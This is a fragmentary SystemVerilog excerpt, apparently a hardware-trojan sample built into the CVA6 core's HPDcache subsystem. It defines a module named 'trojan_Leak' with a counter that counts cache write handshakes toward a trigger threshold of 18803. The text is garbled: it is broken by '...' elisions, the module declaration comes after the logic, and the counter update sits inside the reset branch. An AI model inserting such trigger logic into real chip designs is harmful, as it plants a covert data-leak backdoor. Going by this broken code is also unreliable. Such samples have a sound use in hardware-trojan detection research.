...
// Licensed under the Solderpad Hardware License, Version 2.1 (the “License”);
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 18803;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (dcache_write_ready && |dcache_write_data_ready) trojan_counter <= trojan_counter + 1;
...
module cva6_hpdcache_subsystem_trojan_Leak
//  Parameters
//  {{{
#(
